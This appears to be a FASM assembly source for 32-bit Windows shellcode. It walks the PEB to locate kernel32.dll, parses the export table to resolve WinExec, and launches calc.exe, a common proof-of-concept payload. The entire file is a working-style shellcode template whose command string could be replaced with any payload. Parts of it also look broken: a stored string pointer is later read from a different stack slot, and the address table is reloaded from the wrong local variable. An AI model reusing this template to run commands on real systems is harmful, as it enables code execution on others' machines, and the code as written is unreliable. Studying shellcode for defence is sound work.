format PE console
use32
entry start

start:
    ;save all registers
    push eax
    push ebx
    push ecx
    push edx
    push esi
    push edi
    push ebp

    ;establish a new stack frame -> ebp based stack frame
    push ebp
    mov ebp, esp
    ;allocate memory for local variables
    sub esp, 18h

    ;push function name onto the stack
    xor esi, esi; null terminator
    push esi
    push 63h
    pushw 6578h
    push 456e6957h
    mov [esp-4h], esp; WinExec\x0, store it in local variable var4

    ;find base address of kernel32.dll
    ;fs segment register holds the address to the thread environment block
    xor esi, esi
    mov ebx, [fs:esi+30h]
    mov ebx, [ebx+0Ch];from the peb find the pointer to peb_ldr_data
    ;get pointer to InMemoryOrderModuleList from the peb_ldr_data hint add 14h to peb_ldr_data pointer
    ;In here ntdll.dll is the second entry then kernel32.dll the third entry
    mov ebx, [ebx+14h]; first entry
    mov ebx, [ebx]; second entry -> ntdll.dll
    mov ebx, [ebx]; third entry our target kernel32.dll
    mov ebx, [ebx+10h]; base adrress or kernel32.dll
    mov [ebp-8h], ebx;store it in local variable var8

    ;find WinExec address, some understanding of PE File Format is needed
    mov eax, [ebx+3Ch];get rva of pe signature
    add eax, ebx;get address of pe signature -> rva + base address = address of pe signature
    mov eax, [eax+78h];get export table rva
    add eax, ebx; get export table address
    
    ;get ordinals and names from ordinal table and name pointer table
    mov ecx, [eax+24h]; get rva of ordinal table
    add ecx, ebx; get address of ordinal table
    mov [ebp-0Ch], ecx; save to var12

    mov edi, [eax+20h]; get rva of name pointer table
    add edi, ebx; get address of name pointer table
    mov [ebp-10h], edi; save to var16

    mov edx, [eax+1Ch];get rva of address table
    add edx, ebx; get address of address table
    mov [ebp-14h], edx;save to var20

    mov edx, [eax+14h]; number of exported functions

    xor eax, eax; counter = 0

.loop:
    mov edi, [ebp-10h]; address of name pointer table 
    mov esi, [ebp-4h]; WinExec\x0
    xor ecx, ecx

    cld; set DF to zero left to right
    mov edi, [edi+eax*4]; entries are 4 bytes long get rva of name
    add edi, ebx; get address of name
    add ecx, 8h
    repe cmpsb; compare byte by byte contents in esi with edi

    jz start.found

    inc eax
    cmp eax, edx
    jb start.loop

    add esp, 26h
    jmp start.end

.found:
    mov ecx, [ebp-0Ch]; address of ordinal table
    mov edx, [ebp-10h]; address of address table

    mov ax, [ecx+eax*2]; ordinal number is two bytes long -> 2 * counter
    mov eax, [edx+eax*4]; rva of function => ordinal * 4 + address of address table
    add eax, ebx; address of function

    ;call WinExec
    xor edx, edx
    push edx
    push 6578652eh
	push 636c6163h
	push 5c32336dh
	push 65747379h
	push 535c7377h
	push 6f646e69h
	push 575c3a43h
    mov esi, esp

    push 10
    push esi
    call eax; call WinExec
    add esp, 64h

.end:
    pop ebp
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    pop eax
    ret
      